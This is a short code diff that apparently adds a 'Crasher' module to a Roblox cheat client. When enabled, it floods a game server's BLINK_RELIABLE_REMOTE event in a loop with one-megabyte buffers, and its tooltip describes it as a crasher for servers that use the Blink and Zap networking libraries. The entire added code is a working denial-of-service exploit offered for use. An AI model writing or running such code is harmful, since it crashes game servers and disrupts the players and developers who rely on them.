@@ -916,4 +916,20 @@ run(function()
 		end
 	})
 end)
+
+run(function()
+	Crasher = vape.Categories.Utility:CreateModule({
+		Name = 'Crasher',
+		Function = function(callback)
+			if callback then
+				repeat
+					local Reliable: RemoteEvent = game:GetService("ReplicatedStorage"):WaitForChild("BLINK_RELIABLE_REMOTE") :: RemoteEvent
+					Reliable:FireServer(buffer.create(1000000),{})
+					wait()
+				until not Crasher.Enabled
+			end
+		end,
+		Tooltip = 'BLINK,ZAP SERVER CRASHER'
+	})
+end)
 	
